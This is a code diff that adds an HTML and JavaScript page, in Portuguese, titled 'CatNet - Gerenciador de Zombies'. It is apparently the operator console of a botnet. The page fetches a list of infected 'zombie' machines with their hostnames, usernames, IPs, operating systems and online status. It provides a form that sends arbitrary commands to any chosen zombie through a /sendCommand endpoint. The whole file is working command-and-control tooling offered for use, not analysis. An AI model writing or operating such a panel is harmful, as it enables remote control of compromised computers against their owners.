@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CatNet - Gerenciador de Zombies</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #ffffff;
+            padding: 40px 0;
+        }
+        .container-custom {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 40px;
+            color: #333;
+        }
+        .table-container {
+            background-color: #f9f9f9;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .status-online {
+            color: #28a745;
+            font-weight: bold;
+        }
+        .status-offline {
+            color: #dc3545;
+            font-weight: bold;
+        }
+        .btn-command {
+            background-color: #0d6efd;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .btn-command:hover {
+            background-color: #0b5ed7;
+            text-decoration: none;
+        }
+        .collapse-form {
+            padding: 15px;
+            background-color: #f0f0f0;
+            border-radius: 4px;
+            margin-top: 10px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .btn-submit {
+            background-color: #0d6efd;
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .btn-submit:hover {
+            background-color: #0b5ed7;
+        }
+        .alert-container {
+            display: none;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container-custom">
+        <h1>🐱 CatNet - Gerenciador de Zombies</h1>
+
+        <div id="alertContainer" class="alert-container"></div>
+
+        <div class="text-center mb-3">
+            <button class="btn btn-primary" onclick="loadCats()">🔄 Atualizar</button>
+        </div>
+
+        <div class="table-container">
+            <div id="loadingSpinner" class="text-center mb-3">
+                <div class="spinner-border" role="status">
+                    <span class="visually-hidden">Carregando...</span>
+                </div>
+            </div>
+            <table id="catsTable" class="table table-striped table-hover" style="display: none;">
+                <thead class="table-dark">
+                    <tr>
+                        <th>ID</th>
+                        <th>Nome do PC</th>
+                        <th>Usuário</th>
+                        <th>IP</th>
+                        <th>Sistema Operacional</th>
+                        <th>Status</th>
+                        <th>Último Visto</th>
+                        <th>Ação</th>
+                    </tr>
+                </thead>
+                <tbody id="catsTableBody">
+                </tbody>
+            </table>
+            <div id="noDataMessage" class="alert alert-info" role="alert">
+                Nenhum zombie registrado no sistema.
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Carregar dados dos Cats quando a página carrega
+        document.addEventListener('DOMContentLoaded', function() {
+            loadCats();
+            // Recarregar manualmente apenas quando necessário
+        });
+
+        // Função para carregar os dados dos Cats
+        function loadCats() {
+            fetch('/getCats')
+                .then(response => response.json())
+                .then(data => {
+                    populateTable(data);
+                })
+                .catch(error => {
+                    console.error('Erro ao carregar cats:', error);
+                    showAlert('Erro ao carregar dados dos zombies!', 'danger');
+                });
+        }
+
+        // Função para preencher a tabela com dados
+        function populateTable(cats) {
+            const tbody = document.getElementById('catsTableBody');
+            const table = document.getElementById('catsTable');
+            const noDataMessage = document.getElementById('noDataMessage');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+
+            loadingSpinner.style.display = 'none';
+
+            if (cats.length === 0) {
+                table.style.display = 'none';
+                noDataMessage.style.display = 'block';
+                return;
+            }
+
+            table.style.display = 'table';
+            noDataMessage.style.display = 'none';
+
+            tbody.innerHTML = '';
+
+            cats.forEach((cat, index) => {
+                const statusClass = cat.stat === 'Online' ? 'status-online' : 'status-offline';
+                const lastSeen = new Date(cat.last_seen).toLocaleString('pt-BR');
+                
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${cat.id}</td>
+                    <td>${cat.pcName}</td>
+                    <td>${cat.username}</td>
+                    <td>${cat.ip}</td>
+                    <td>${cat.os}</td>
+                    <td><span class="${statusClass}">${cat.stat}</span></td>
+                    <td>${lastSeen}</td>
+                    <td>
+                        <button class="btn-command" type="button" data-bs-toggle="collapse" data-bs-target="#collapse${index}" aria-expanded="false">
+                            Enviar Comando
+                        </button>
+                        <div class="collapse collapse-form mt-2" id="collapse${index}">
+                            <form onsubmit="sendCommand(event, '${cat.ip}')">
+                                <input type="hidden" name="zombieIP" value="${cat.ip}">
+                                <div class="form-group">
+                                    <label for="command${index}" style="display: block; margin-bottom: 8px; font-weight: 500;">Comando:</label>
+                                    <input type="text" id="command${index}" name="command" class="form-control" placeholder="Digite o comando..." required>
+                                </div>
+                                <button type="submit" class="btn-submit">Enviar</button>
+                            </form>
+                        </div>
+                    </td>
+                `;
+                tbody.appendChild(row);
+            });
+        }
+
+        // Função para enviar comando
+        function sendCommand(event, zombieIP) {
+            event.preventDefault();
+            
+            const form = event.target;
+            const command = form.querySelector('input[name="command"]').value;
+
+            const payload = {
+                zombieIP: zombieIP,
+                command: command
+            };
+
+            fetch('/sendCommand', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.success) {
+                    showAlert(`Comando enviado com sucesso para ${zombieIP}!`, 'success');
+                    form.reset();
+                    // Fechar o collapse após enviar
+                    const bsCollapse = new bootstrap.Collapse(form.closest('.collapse'), { toggle: false });
+                    bsCollapse.hide();
+                } else {
+                    showAlert(`Erro: ${data.message}`, 'danger');
+                }
+            })
+            .catch(error => {
+                console.error('Erro ao enviar comando:', error);
+                showAlert('Erro ao enviar comando!', 'danger');
+            });
+        }
+
+        // Função para mostrar alertas
+        function showAlert(message, type) {
+            const alertContainer = document.getElementById('alertContainer');
+            alertContainer.innerHTML = `<div class="alert alert-${type} alert-dismissible fade show" role="alert">
+                ${message}
+                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+            </div>`;
+            alertContainer.style.display = 'block';
+
+            // Auto-remove alert após 5 segundos
+            setTimeout(() => {
+                alertContainer.style.display = 'none';
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
